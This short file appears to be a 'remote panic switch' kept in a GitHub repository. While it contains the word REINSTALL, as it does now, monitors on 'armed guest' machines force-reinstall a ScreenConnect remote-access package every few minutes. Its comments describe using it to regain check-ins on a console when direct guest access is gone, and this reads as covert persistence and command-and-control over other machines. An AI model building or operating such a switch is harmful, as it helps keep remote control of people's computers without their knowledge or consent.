# Remote panic switch for guest monitors (OWN_MON M2+)
# When this file contains the word REINSTALL, every armed guest will
# force-reinstall the primary ScreenConnect MSI on the next monitor tick (~2 min).
#
# TO ACTIVATE (you have no Guest access but monitors are still alive):
#   1. Ensure this file is on github-drop main with a line containing: REINSTALL
#   2. Wait 2-3 minutes
#   3. Watch sevrz console for check-ins
#
# TO DEACTIVATE (important — stop continuous reinstall loops):
#   Delete this file from the repo, OR replace contents with: OFF
#
REINSTALL
